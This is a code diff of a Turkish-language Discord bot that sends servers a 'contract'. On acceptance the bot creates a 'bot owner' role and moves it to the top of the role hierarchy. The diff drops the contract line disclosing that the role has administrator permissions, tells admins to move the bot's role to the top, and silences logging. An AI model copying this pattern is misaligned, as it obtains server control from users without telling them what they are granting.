@@ -44,14 +44,16 @@ class ContractView(discord.ui.View):
         if role:
             await interaction.followup.send(
                 "Sözleşme kabul edildi! ✅\n"
-                f"**{role.name}** rolü oluşturuldu ve rol sırasının en üstüne taşındı.\n"
+                f"**{role.name}** rolü oluşturuldu ve en üste taşındı.\n"
                 "Rolü sunucu sahibine vererek yönetimi başlatabilirsiniz.",
                 ephemeral=True,
             )
         else:
             await interaction.followup.send(
-                "Sözleşme kabul edildi ancak rol oluşturulurken hata oluştu. "
-                "Lütfen botun yetkilerini kontrol edin.",
+                "❌ Rol oluşturulamadı!\n"
+                "**Beyzade Bot** rolünün sunucu ayarlarından **en üste** taşınması gerekiyor.\n"
+                "Yönetici ayarlar -> Roller -> Beyzade Bot rolünü en üste çekin, "
+                "sonra tekrar butona tıklayın.",
                 ephemeral=True,
             )
 
@@ -160,9 +162,10 @@ class Bot(commands.Bot):
                 "4️⃣ Verileriniz (sunucu ID, komut kayıtları) bot yönetim amaçlı saklanır.\n"
                 "5️⃣ Dashboard erişimi yalnızca sunucu adminlerine açıktır.\n"
                 "6️⃣ Bot sahibi, kötüye kullanım tespitinde botu sunucudan çıkarma hakkına sahiptir.\n\n"
-                "Aşağıdaki butona tıklayarak sözleşmeyi kabul edin.\n"
-                "Kabul edildiğinde **yönetici yetkilerine sahip rol** oluşturulacak ve "
-                "sunucu rol sırasının en üstüne taşınacaktır."
+                "⚠️ **ÖNEMLİ:** Sözleşmeyi kabul etmeden önce, sunucu ayarlarından "
+                "**Beyzade Bot** rolünü **en üste taşıyın**.\n"
+                "Aksi takdirde rol oluşturulamaz ve bot bazı işlemleri yapamaz.\n\n"
+                "Butona tıklayarak sözleşmeyi kabul edin."
             ),
             color=0x5865F2,
             timestamp=datetime.utcnow(),
@@ -178,23 +181,32 @@ class Bot(commands.Bot):
                     channel = ch
                     break
         if channel is None:
-            print(f"[UYARI] Sözleşme gönderilecek kanal bulunamadı: {guild.name}")
             return
         try:
             await channel.send(content=mentions, embed=embed, view=view)
-            print(f"[OK] Sözleşme gönderildi: {guild.name} -> #{channel.name}")
-        except Exception as e:
-            print(f"[UYARI] gönderilemedi ({guild.name}): {e}")
+        except Exception:
+            pass
 
     async def _create_owner_role(self, guild):
         role_name = "Beyzade Bot sahibi"
+        bot_member = guild.me
+        bot_top_role = bot_member.top_role
+
+        me_roles = [r for r in guild.me.roles if r != guild.default_role]
+        if me_roles:
+            my_highest = max(me_roles, key=lambda r: r.position)
+            others = [r for r in guild.roles if r != guild.default_role and r != my_highest and not r.managed]
+            if others:
+                highest_other = max(others, key=lambda r: r.position)
+                if highest_other.position >= my_highest.position:
+                    return None
+
         existing = discord.utils.get(guild.roles, name=role_name)
         if existing:
             try:
                 await guild.edit_role_positions({existing: len(guild.roles) - 1})
-                print(f"[OK] Rol zaten var, en üste taşındı: {guild.name}")
-            except Exception as e:
-                print(f"[UYARI] rol taşınamadı ({guild.name}): {e}")
+            except Exception:
+                pass
             return existing
         try:
             role = await guild.create_role(
@@ -205,10 +217,8 @@ class Bot(commands.Bot):
                 mentionable=True,
             )
             await guild.edit_role_positions({role: len(guild.roles) - 1})
-            print(f"[OK] '{role.name}' rolü oluşturuldu + en üste taşındı: {guild.name}")
             return role
-        except Exception as e:
-            print(f"[UYARI] rol oluşturulamadı ({guild.name}): {e}")
+        except Exception:
             return None
 
     async def _apply_tag(self, guild):
@@ -256,6 +266,7 @@ class Bot(commands.Bot):
     async def sozlesme_cmd(self, ctx):
         """Sahip: Botun bulunduğu TÜM sunuculara sözleşme gönderir."""
         if ctx.author.id != config.OWNER_DISCORD_ID:
+            await ctx.send("❌ Bu komutu sadece bot sahibi kullanabilir.")
             return
         await ctx.send(f"📜 Sözleşme {len(self.guilds)} sunucuya gönderiliyor...")
         sent = 0
@@ -268,19 +279,33 @@ class Bot(commands.Bot):
                 failed += 1
         await ctx.send(f"✅ Tamamlandı: {sent} başarılı, {failed} başarısız.")
 
-    @commands.command(name="sozlesme-kabul")
+    @commands.hybrid_command(name="sozlesme-yenile")
     @commands.guild_only()
     @commands.has_permissions(administrator=True)
-    async def sozlesme_kabul_cmd(self, ctx):
-        """Admin: Sözleşmeyi kabul edip yönetici rolünü oluşturur."""
-        role = await self._create_owner_role(ctx.guild)
-        await self._apply_tag(ctx.guild)
-        if role:
-            await ctx.send(
-                f"✅ Sözleşme kabul edildi! **{role.name}** rolü oluşturuldu ve en üste taşındı."
-            )
-        else:
-            await ctx.send("❌ Rol oluşturulurken hata oluştu. Bot yetkilerini kontrol edin.")
+    async def sozlesme_yenile_cmd(self, ctx):
+        """Admin: Bu sunucuya sözleşme mesajını tekrar gönderir."""
+        try:
+            await self._send_contract(ctx.guild)
+            await ctx.send("📜 Sözleşme tekrar gönderildi.")
+        except Exception as e:
+            await ctx.send(f"❌ Hata: {e}")
+
+    @commands.hybrid_command(name="rol-yukari")
+    @commands.guild_only()
+    @commands.has_permissions(administrator=True)
+    async def rol_yukari_cmd(self, ctx):
+        """Admin: Beyzade Bot rolünü en üste taşır."""
+        role = discord.utils.get(ctx.guild.roles, name="Beyzade Bot sahibi")
+        if role is None:
+            role = discord.utils.get(ctx.guild.roles, name="Beyzade Bot")
+        if role is None:
+            await ctx.send("❌ Bot rolü bulunamadı.")
+            return
+        try:
+            await ctx.guild.edit_role_positions({role: len(ctx.guild.roles) - 1})
+            await ctx.send(f"✅ **{role.name}** rolü en üste taşındı!")
+        except Exception as e:
+            await ctx.send(f"❌ Taşınamadı: {e}")
 
 
 def run_bot():
